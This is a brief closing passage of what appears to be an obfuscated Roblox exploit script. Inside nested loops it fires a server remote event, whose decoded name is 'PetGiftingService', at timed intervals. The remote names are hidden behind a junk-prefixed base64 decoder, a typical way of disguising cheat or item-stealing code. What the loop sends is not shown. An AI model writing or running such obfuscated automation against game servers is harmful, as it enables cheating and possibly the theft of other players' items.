                            ReplicatedStorage:WaitForChild(bTFtzkfAxlCoaBES('uXecTvUNZKYdUkEfduGYEXEvhtaAAxYLCDAnNkqWvbKpCLEjwSRxvyUR2FtZUV2ZW50cw==')):WaitForChild(bTFtzkfAxlCoaBES('whklITxbvxzbXILMTuBelogzYTQoGWNAjHgDurUiuHvJKUqVUvHPiJXUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
